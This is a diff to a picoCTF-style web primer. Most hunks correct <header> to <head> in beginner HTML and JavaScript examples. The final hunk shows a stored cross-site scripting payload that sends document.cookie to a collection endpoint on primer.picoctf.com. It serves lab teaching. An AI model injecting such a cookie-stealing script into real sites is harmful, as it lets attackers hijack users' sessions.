@@ -41,9 +41,9 @@ Now let's make a page with more fields so you can get a sense of tags and the st
 
 [source,html]
 <html>
-<header>
+<head>
    <title>This is a picoCTF html Example</title>
-</header>
+</head>
 <body>
    <h1>This is a Heading</h1>
    <h2>This is a smaller Heading</h2>
@@ -65,7 +65,7 @@ If you read the html code and try to analyze its content, you will realize the f
 * The title shown in that tab of the browser "This is a picoCTF html Example", appears there because you put that text inside in the <title></title> tags.
 * <h1> Is used to create a big heading
 * <h2> creates a heading smaller than <h1>
-* The <header> tags are used to group introductory content, in this case the title, but if you remove this tag, you will not see much change in our page. Do the experiment of removing it. If you only remove the opening or closing tag it will cause an html error, so make sure to delete the opening tag and closing tag.
+* The <head> tags are used to group introductory content, in this case the title, but if you remove this tag, you will not see much change in our page. Do the experiment of removing it. If you only remove the opening or closing tag it will cause an html error, so make sure to delete the opening tag and closing tag.
 * The <body> tags are used to group the main content of the page. If you remove them you will not see much change in our page because we have just a few things. However, in several cases you might break a page completely if you remove a tag without proper care.
 
 You may have noted the <img> tag is not showing any image as it should. Why? Let's analyze the element img:
@@ -111,12 +111,12 @@ If that file happens to contain JavaScript, your browser will execute it. Let's 
 
 [source,html]
 <html>
-    <header>
+    <head>
         <title>This is a picoCTF JS Example</title>
         <script>
             alert("Hello picoCTF");
         </script>
-    </header>
+    </head>
     <body>
         <h1>JavaScript example</h1>>
     </body>
@@ -168,7 +168,7 @@ Now let's use some more elaborated code. We are going to make a page that adds t
 
 [source,html]
 <html>
-    <header>
+    <head>
         <title>This is a picoCTF JS Example</title>
         <script>
             function myFunctionSum(){
@@ -178,7 +178,7 @@ Now let's use some more elaborated code. We are going to make a page that adds t
                 alert(result);
             }
         </script>
-    </header>
+    </head>
     <body>
         <h1>JavaScript example to add2 numbers</h1>
         Input the first number<br> 
@@ -346,7 +346,7 @@ But now, put this JavaScript code in the description:
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
 <script>
 $.get(
-    "http://primer.picoctf.com/vuln/web/insert.php",
+    "https://primer.picoctf.com/vuln/web/insert.php",
     {cookie : document.cookie, hackername : 'YourName'},
     function(data) {
         alert("I just stole the cookie!");
